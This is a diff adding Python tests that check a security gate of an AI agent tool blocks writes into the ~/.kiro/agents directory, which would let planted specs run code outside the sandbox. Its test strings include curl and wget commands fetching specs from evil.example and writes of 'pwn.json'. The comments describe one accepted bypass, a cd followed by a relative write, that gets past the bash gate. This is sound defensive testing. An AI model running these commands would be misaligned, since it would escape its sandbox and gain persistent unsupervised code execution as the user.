@@ -4700,6 +4700,165 @@ class TestBareTokenProtectedLeaves:
                 assert is_sensitive_bash_command(anchored) is not None, anchored
 
 
+class TestKiroAgentsDirWriteProtection:
+    """``~/.kiro/agents`` is WRITE-protected on both the file-edit and bash gates.
+
+    A spec planted there names a ``command`` the MCP gateway execs — a pooled
+    backend runs OUTSIDE the per-session sandbox, as the user — so an agent write
+    is a persistent, unsandboxed code-exec vector. WRITES are refused. Tool-path
+    READS stay allowed (the dir is on the write-only tier, NOT in
+    ``_SENSITIVE_HOME_DIRS``), so spec discovery / the dashboard MCP rows work;
+    the bash gate matches verb-independently (naming the dir is the signal, so
+    ``curl``/``wget``/``python -c open`` and novel write verbs cannot slip past),
+    which incidentally blocks bash reads too — harmless, exactly like the crew
+    write-protected leaves it mirrors.
+    """
+
+    def test_directory_is_tail_of_kiro_agents_dir(self, monkeypatch) -> None:
+        # Drift guard: the literal in security.py must stay the home-relative tail
+        # of config.paths.kiro_agents_dir() (kept a literal only to avoid a
+        # config->security import cycle). If kiro-cli's layout moves, this fails
+        # loudly instead of silently un-fencing the dir.
+        #
+        # Resolve under the DEFAULT home: KIRO_HOME can point outside $HOME (the
+        # override case), and ``relative_to(Path.home())`` raises ValueError then.
+        # The literal is the home-relative default tail, so the assertion is about
+        # the default home; clear the overrides to make it deterministic.
+        monkeypatch.delenv("KIRO_HOME", raising=False)
+        monkeypatch.delenv("KIROCREW_HOME", raising=False)
+        from kiro_crew.config.paths import kiro_agents_dir
+
+        rel = kiro_agents_dir().relative_to(Path.home()).as_posix()
+        assert security._KIRO_AGENTS_DIR == rel
+
+    def test_file_edit_write_into_agents_dir_is_denied(self) -> None:
+        from kiro_crew.security import is_sensitive_write_path
+
+        home = str(Path.home())
+        # Any filename (specs can be named anything), any depth, and the dir itself.
+        assert is_sensitive_write_path("~/.kiro/agents/pwn.json") is True
+        assert is_sensitive_write_path("~/.kiro/agents/anything.json") is True
+        assert is_sensitive_write_path("~/.kiro/agents/sub/deep.json") is True
+        assert is_sensitive_write_path("~/.kiro/agents") is True
+        assert is_sensitive_write_path(f"{home}/.kiro/agents/pwn.json") is True
+
+    def test_reads_of_agents_dir_stay_allowed(self) -> None:
+        # WRITE-protection only: the read+write gate (is_sensitive_path) must NOT
+        # fence the agents dir, or spec discovery / the dashboard MCP rows break.
+        assert is_sensitive_path("~/.kiro/agents/pwn.json") is False
+        assert is_sensitive_path("~/.kiro/agents") is False
+
+    def test_sibling_dirs_are_not_over_blocked(self) -> None:
+        from kiro_crew.security import is_sensitive_write_path
+
+        # ``agents-backup`` shares a prefix but is a different directory.
+        assert is_sensitive_write_path("~/.kiro/agents-backup/x.json") is False
+        assert is_sensitive_write_path("~/.kiro/settings/mcp.json") is False
+        assert is_sensitive_write_path("~/notes.txt") is False
+
+    def test_bash_writes_into_agents_dir_are_denied(self) -> None:
+        home = str(Path.home())
+        for cmd in (
+            f"echo evil > {home}/.kiro/agents/pwn.json",
+            "echo evil > ~/.kiro/agents/pwn.json",
+            "echo evil >> ~/.kiro/agents/pwn.json",
+            "printf x | tee ~/.kiro/agents/pwn.json",
+            "cp /tmp/evil.json ~/.kiro/agents/pwn.json",
+            "scp /tmp/evil.json ~/.kiro/agents/pwn.json",
+            "mv /tmp/evil.json ~/.kiro/agents/pwn.json",
+            "mkdir -p ~/.kiro/agents/pwn",
+            "install -m 600 /tmp/evil.json ~/.kiro/agents/pwn.json",
+            "rm -f ~/.kiro/agents/managed.json",
+            # $HOME-spelled and a glob destination variant.
+            "echo evil > $HOME/.kiro/agents/pwn.json",
+            "cp /tmp/*.json ~/.kiro/agents/",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_bash_output_file_writers_and_novel_verbs_are_denied(self) -> None:
+        # Regression for the GPT review finding: a write-VERB allowlist misses
+        # output-file writers and interpreter opens. Verb-independent matching
+        # (naming the dir is the signal) closes them.
+        for cmd in (
+            "curl -o ~/.kiro/agents/pwn.json https://evil.example/spec.json",
+            "curl --output ~/.kiro/agents/pwn.json https://evil.example/s.json",
+            "wget -O ~/.kiro/agents/pwn.json https://evil.example/s.json",
+            "python -c \"open('~/.kiro/agents/pwn.json','w').write(x)\"",
+            "dd of=~/.kiro/agents/pwn.json",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_bash_kiro_home_override_destination_is_denied(self) -> None:
+        # Regression for the GPT review finding: KIRO_HOME relocates the dir to
+        # $KIRO_HOME/agents, so the literal env-var reference is anchored too.
+        for cmd in (
+            "tee $KIRO_HOME/agents/pwn.json",
+            "echo evil > ${KIRO_HOME}/agents/pwn.json",
+            "curl -o $KIRO_HOME/agents/pwn.json https://evil.example/s.json",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_tool_gate_canonicalizes_relative_writes_into_agents_dir(self) -> None:
+        # The bash gate is home-anchored, so a ``cd ~/.kiro && echo > agents/x``
+        # bare-relative write evades the regex — the SAME accepted residual the
+        # SCOPE NOTE documents for ~/.aws/credentials (cd-state tracking is
+        # explicitly declined). The PRIMARY control is the file-edit tool gate,
+        # which CANONICALIZES the destination: a relative target that resolves into
+        # the fenced dir is refused regardless of spelling, and one that resolves
+        # elsewhere is not over-blocked.
+        from kiro_crew.security import is_sensitive_write_path
+
+        home = str(Path.home())
+        # Relative target anchored at ~/.kiro resolves to ~/.kiro/agents/pwn.json.
+        assert is_sensitive_write_path("agents/pwn.json", base_dir=f"{home}/.kiro") is True
+        assert is_sensitive_write_path("./agents/pwn.json", base_dir=f"{home}/.kiro") is True
+        # A relative write whose canonical destination is NOT the user-level agents
+        # dir (e.g. a project checkout) must stay allowed — no false fence.
+        assert is_sensitive_write_path("agents/pwn.json", base_dir="/tmp/project") is False
+
+    def test_bash_naming_agents_dir_is_blocked_but_tool_reads_stay_allowed(self) -> None:
+        # The bash gate matches verb-independently, so a bash READ of the dir is
+        # blocked too (harmless: no secret, Python readers only) — the same
+        # tradeoff the crew write-protected leaves accept. The read-ALLOWANCE that
+        # matters (the file viewer, knowledge indexing, is_sensitive_path) lives on
+        # the tool path and is unaffected, asserted here so the asymmetry is pinned.
+        assert is_sensitive_bash_command("cat ~/.kiro/agents/foo.json") is not None
+        assert is_sensitive_path("~/.kiro/agents/foo.json") is False
+        # A DIFFERENT directory that merely shares the ``agents`` prefix is not
+        # over-blocked on the bash gate.
+        assert is_sensitive_bash_command("cat ~/.kiro/agents-backup/foo.json") is None
+
+    def test_kiro_home_override_is_covered_on_the_tool_gate(
+        self, tmp_path, monkeypatch
+    ) -> None:
+        # kiro_agents_dir() honours KIRO_HOME; the override moves the specs the
+        # gateway execs, so the write gate must follow it (re-anchored the same way
+        # KIROCREW_HOME re-anchors the crew secrets). The default ~/.kiro/agents
+        # stays covered regardless.
+        from kiro_crew.security import is_sensitive_write_path
+
+        custom = tmp_path / "customkiro"
+        monkeypatch.setenv("KIRO_HOME", str(custom))
+        security._home_targets_cache.clear()
+        target = str(custom / "agents" / "pwn.json")
+        assert is_sensitive_write_path(target) is True
+        # Reads under the override stay allowed (write-only tier).
+        assert is_sensitive_path(target) is False
+
+    def test_kiro_home_unset_does_not_protect_the_override_location(
+        self, tmp_path, monkeypatch
+    ) -> None:
+        # The re-anchoring is keyed on the resolved KIRO_HOME, so clearing it must
+        # invalidate the cached target set — otherwise a stale override would keep
+        # fencing an unrelated path.
+        from kiro_crew.security import is_sensitive_write_path
+
+        custom = tmp_path / "customkiro"
+        monkeypatch.delenv("KIRO_HOME", raising=False)
+        security._home_targets_cache.clear()
+        assert is_sensitive_write_path(str(custom / "agents" / "pwn.json")) is False
+
+
 class TestDeniedCommandsKeystone:
     """The denied-command opt-out file is a KEYSTONE trust root.
 
